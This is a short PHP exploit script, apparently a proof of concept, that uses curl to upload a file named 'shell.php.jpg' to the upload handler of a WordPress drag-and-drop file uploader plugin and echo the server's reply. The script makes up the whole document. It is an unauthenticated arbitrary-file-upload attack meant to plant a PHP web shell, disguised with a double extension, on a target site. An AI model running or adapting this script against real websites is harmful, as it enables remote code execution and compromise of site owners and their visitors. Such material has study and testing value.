<?php
$u="shell.php.jpg";
$c = curl_init("http://www.example.com/wp/wp-content/plugins/drag-drop-file-uploader/dnd-upload.php");
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS,
array('file'=>"@$u"));
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
$e = curl_exec($c);
curl_close($c);
echo $e;
?>
